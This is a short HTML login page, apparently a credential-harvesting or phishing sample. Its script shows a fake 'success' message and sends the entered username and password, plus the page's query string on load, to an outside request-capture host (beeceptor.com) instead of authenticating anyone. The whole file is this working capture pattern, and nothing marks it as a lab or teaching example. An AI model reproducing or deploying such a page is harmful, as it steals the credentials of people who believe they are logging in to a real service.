<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login page</title>
</head>
<body>
    <div id="loginDiv">
        <p>Text</p>
        <form id="loginForm" method="POST">
            <input placeholder="username..." name="username">
            <input placeholder="password..." name="password" type="password">
        </form>
        <button onclick="logFormdata()">Login</button>
    </div>
    <div id="successDiv" style="display: none;">
        Suuccess!
    </div>
</body>
<script>
    function logFormdata(){
        console.log("clicked");
        document.getElementById("loginDiv").style.display="none";
        document.getElementById("successDiv").style.display="inline";
        var form = document.getElementById("loginForm");
        console.log(form);
        var data = new FormData(form);
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST","https://zxcvb.free.beeceptor.com",true);
        xhttp.send(data);
        console.log(data);
    }
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET","https://zxcvb.free.beeceptor.com/"+location.search,true);
    xhttp.send();
</script>
</html>
